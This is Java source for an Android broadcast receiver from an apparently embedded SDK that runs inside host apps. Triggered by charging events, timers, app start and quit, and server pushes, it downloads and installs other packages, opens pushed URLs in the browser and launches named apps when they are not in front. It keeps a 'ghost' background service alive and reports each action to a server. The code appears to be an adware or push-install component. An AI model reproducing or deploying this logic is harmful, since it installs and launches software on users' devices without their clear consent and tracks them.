package com.tbu.android.lamy.event;

import com.tbu.android.lamy.LamyConfig;
import com.tbu.android.lamy.LamyManager;
import com.tbu.android.lamy.cache.CacheManager;
import com.tbu.android.lamy.ghost.service.GhostManager;
import com.tbu.android.lamy.ghost.service.GhostService;
import com.tbu.android.lamy.server.ServerManager;
import com.tbu.android.lamy.server.domain.PhInfo;
import com.tbu.android.lamy.util.Debug;
import com.tbu.android.lamy.util.SessionUtil;
import com.tbu.androidtools.device.DeviceUtil;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class EventReceiver extends BroadcastReceiver {
	
	public static final String ACTION_APP_START = "ACTION_APP_START";	//	App进入
	public static final String ACTION_APP_QUIT = "ACTION_APP_QUIT";	//	App退出

	public static final String ACTION_APP_INSTALL = "ACTION_APP_INSTALL";	//	宿主应用程序启动-安装任务
	public static final String ACTION_APP_INSTALL_DIRECT = "ACTION_APP_INSTALL_DIRECT";	//	宿主应用程序启动-直接安装安装任务
	public static final String ACTION_APP_DOWNLOAD = "ACTION_APP_DOWNLOAD";	//	宿主应用程序启动-下载任务
	public static final String ACTION_TIME_INSTALL = "ACTION_TIME_INSTALL";		//	定时器启动-安装请求
	public static final String ACTION_TIME_DOWNLOAD = "ACTION_TIME_DOWNLOAD";		//	定时器启动-下载请求
	public static final String ACTION_CI = "ACTION_CI";		//	定时器启动检查应用是否安装和在运行，如果安装了未运行尝试启动
	
	public static final String ACTION_SYNC = "ACTION_SYNC";		//	定时器启动异步上传同步上传失败的数据

	
	public static final String ACTION_FIRST_USEAPP = "ACTION_FIRST_USEAPP";		//	定时器启动-安装请求
	
	public static final String IB_KEY_PACKAGMNAME = "IB_KEY_PACKAGMNAME";		// Intent参数，packagename
	public static final String IB_KEY_ACTION = "IB_KEY_ACTION";		// Intent参数，action来源
	
	public static final String ACTION_NOTIFICATION_INSTALL = "ACTION_NOTIFICATION_INSTALL";		//	notification-安装请求
	public static final String IB_KEY_INSTALLAPPKEY = "IB_KEY_INSTALLAPPKEY";		// Intent参数，packagename
	
	public static final String ACTION_NOTIFICATION_WEB = "ACTION_NOTIFICATION_WEB";		//	notification-安装请求-通过浏览器下载
	public static final String IB_KEY_WEBURL = "IB_KEY_WEBURL";		
	
	public static final String ACTION_PERVICE_KEEP = "ACTION_PUSHSERVICE_KEEP";
	
	public static final String ACTION_CONPH_TYPE_1 = "ACTION_CONPUSH_TYPE_1";	//	长连接ph-notification，浏览器下载
	public static final String ACTION_CONPH_TYPE_2 = "ACTION_CONPUSH_TYPE_2";	//	长连接ph-先下载，再进行notification任务
	public static final String ACTION_CONPH_TYPE_3 = "ACTION_CONPUSH_TYPE_3";	//	长连接先下载，再直接弹出安装提示
	public static final String ACTION_CONPH_TYPE_4 = "ACTION_CONPUSH_TYPE_4";	// 下载后安装-文件已经存在了
	
	@Override
	public void onReceive(final Context context, final Intent intent) {
		final String action = intent.getAction();
		Debug.i("EventReceiver[]->onReceive, receiver action = " + action);
		
		if ( ACTION_PERVICE_KEEP.equals(action) )  {
			LamyManager.getInstance().setNextReqInstallTime(context, 
					GhostService.DEFAULT_WAIT_KEEP_TIME, 
					EventReceiver.ACTION_PERVICE_KEEP,
					GhostService.AC_REQUEST_CODE);
			GhostManager.getInstance().updateServiceState();
			return ;
		}
		
		if(ACTION_CI.equals(action)) {
			Bundle bundle = intent.getExtras();
			// 按照协议取参数：包名
	        String packageName = bundle.getString(EventReceiver.IB_KEY_PACKAGMNAME);
	        String reqAction = bundle.getString(EventReceiver.IB_KEY_ACTION);
	        EventReceiver.checkInstall(context, packageName, reqAction);
	        return ;
		}else if(ACTION_SYNC.equals(action)) {
			CacheManager.checkNeedSync(context);
	        return ;
		}else if(ACTION_NOTIFICATION_INSTALL.equals(action)) {
			Bundle bundle = intent.getExtras();
			int installAppKey = bundle.getInt(EventReceiver.IB_KEY_INSTALLAPPKEY);
			LamyManager.getInstance().doInstallByDir(context, installAppKey, 0, ACTION_NOTIFICATION_INSTALL,
					PhInfo.PHTYPE_NOTIFYCATION_INSTALL);
	        return ;
		}else if(ACTION_NOTIFICATION_WEB.equals(action)) {
			// TODO : 以下这部分代码考虑移动到PhManager中。
			try{
				Bundle bundle = intent.getExtras();
				String url = bundle.getString(EventReceiver.IB_KEY_WEBURL);
				// TODO : 应该多传递几个参数过来。便于统计信息并且目前也无法检查。
				Uri uri = Uri.parse(url);
				Intent  webIntent = new  Intent(Intent.ACTION_VIEW, uri);
				webIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  
				context.startActivity(webIntent);
				
				PhInfo phInfo = new PhInfo();
				phInfo.ph_version = LamyConfig.VERSION;
				phInfo.ph_type = PhInfo.PHTYPE_NOTIFYCATION_WEB;
				phInfo.ph_game_name = "amsorry";
				phInfo.session_id = 0;
				phInfo.req_install_times = 0;
				phInfo.req_action = action;
				ServerManager.doPostPhMarkTask(context, phInfo);
			}catch(Exception e) {
				Debug.e("EventReceiver->onReceive, e = " + e.toString());
			}
	        return ;
		}
		
		new Thread(new Runnable() {
			@Override
			public void run() {
				boolean result = ServerManager.updateDownloadInfo(context);
				if(result) {
					Debug.i("EventReceiver->onReceive, allow ph");
					if ( Intent.ACTION_POWER_CONNECTED.equals(action) ) {
						Debug.i("EventReceiver->onReceive, download and install");
						LamyManager.getInstance().setNextReqInstallTime(context, LamyManager.DEFAULT_WAIT_TIME, 
								EventReceiver.ACTION_TIME_INSTALL, SessionUtil.getAlarmId(context));
						LamyManager.getInstance().doDownloadTask(context, SessionUtil.getSessionId(context), action, false);
					}else if(Intent.ACTION_POWER_DISCONNECTED.equals(action)) {
						Debug.i("EventReceiver->onReceive, download and install");
						LamyManager.getInstance().doInstallTask(context, SessionUtil.getSessionId(context), action);
					}else if(ACTION_TIME_INSTALL.equals(action) ) {
						LamyManager.getInstance().doInstallTask(context, SessionUtil.getSessionId(context), action);
					}else if(ACTION_APP_INSTALL.equals(action)) {
						LamyManager.getInstance().doInstallTask(context, SessionUtil.getSessionId(context), action);
					}else if(ACTION_TIME_DOWNLOAD.equals(action) || ACTION_APP_INSTALL.equals(action)) {
						LamyManager.getInstance().doInstallTask(context, SessionUtil.getSessionId(context), action);
					}else if(ACTION_FIRST_USEAPP.equals(action)) {
						LamyManager.getInstance().doInstallTask(context, SessionUtil.getSessionId(context), action);
					}else if(ACTION_APP_START.equals(action)) {
						LamyManager.getInstance().doInstallTask(context, SessionUtil.getSessionId(context), action);
					}else if(ACTION_APP_QUIT.equals(action)) {
						LamyManager.getInstance().doInstallTask(context, SessionUtil.getSessionId(context), action);
					}
				}else {
					Debug.i("EventReceiver->onReceive, !!NOT!! allow ph");
				}
				
				
			}
		}).start();
		
		
	}
	
	/**
	 * 处理包名检查任务
	 * @param context
	 * @param packageName
	 * @param action
	 */
	public static void checkInstall(final Context context, final String packageName, final String reqAction ) {
		Debug.i("EventReceiver->onReceive, ACTION_CI, packageName = " + packageName + 
				";reqAction = " + reqAction);
        if(packageName==null) {
        		PhInfo phInfo = new PhInfo();
			phInfo.ph_version = LamyConfig.VERSION;
			phInfo.ph_type = PhInfo.PHTYPE_STARTAPP_ERRORPACKNAME;
			phInfo.req_action = reqAction;
			phInfo.ph_game_name = packageName;
			ServerManager.doPostPhMarkTask(context, phInfo);
        		return ;
        }
        // STEP2 ：检查应用是否已经安装
        if( DeviceUtil.isAvilible(context, packageName) ) {
        		Debug.i("EventReceiver->onReceive, ACTION_CI, DeviceUtil.isAvilible = true");
        		// STEP3 : 检查应用是否处于启动状态
        		if(!SessionUtil.isTopApp(context, packageName)) {
        			Debug.i("EventReceiver->onReceive, ACTION_CI, SessionUtil.isTopApp = false");
        			// STEP4 : 满足条件，启动应用
        			try {
        				Intent intentForNewApp = context.getPackageManager().getLaunchIntentForPackage(packageName);
	        			context.startActivity(intentForNewApp);
	        			// 向Server记录一条。请求启动应用。
	        			PhInfo phInfo = new PhInfo();
	    				phInfo.ph_version = LamyConfig.VERSION;
	    				phInfo.ph_type = PhInfo.PHTYPE_STARTAPP;
	    				phInfo.req_action = reqAction;
	    				phInfo.ph_game_name = packageName;
	    				ServerManager.doPostPhMarkTask(context, phInfo);
	        			Debug.i("EventReceiver->onReceive, ACTION_CI, Req start App");
	        			
        			}catch(Exception e) {
        				// 向Server记录一条。请求启动应用失败。
        				PhInfo phInfo = new PhInfo();
	    				phInfo.ph_version = LamyConfig.VERSION;
	    				phInfo.ph_type = PhInfo.PHTYPE_STARTAPP_ERROR;
	    				phInfo.req_action = reqAction;
	    				phInfo.ph_game_name = packageName;
	    				ServerManager.doPostPhMarkTask(context, phInfo);
        				Debug.e("EeentReceiver->onReceive, ACTION_CI." + e.toString());
        			}
        		}else {
        			// 向Server记录一条。已经启动。
        			PhInfo phInfo = new PhInfo();
    				phInfo.ph_version = LamyConfig.VERSION;
    				phInfo.ph_type = PhInfo.PHTYPE_STARTAPP_ONTOP;
    				phInfo.req_action = reqAction;
    				phInfo.ph_game_name = packageName;
    				ServerManager.doPostPhMarkTask(context, phInfo);
        			Debug.i("EventReceiver->onReceive, ACTION_CI, SessionUtil.isTopApp = true");
        		}
        }else {
        		//向Server记录一条。请求后未安装。
        		PhInfo phInfo = new PhInfo();
			phInfo.ph_version = LamyConfig.VERSION;
			phInfo.ph_type = PhInfo.PHTYPE_STARTAPP_ERRORUNINSTALL;
			phInfo.req_action = reqAction;
			phInfo.ph_game_name = packageName;
			ServerManager.doPostPhMarkTask(context, phInfo);
        		Debug.i("EventReceiver->onReceive, ACTION_CI, DeviceUtil.isAvilible = false");
        }
	}

}
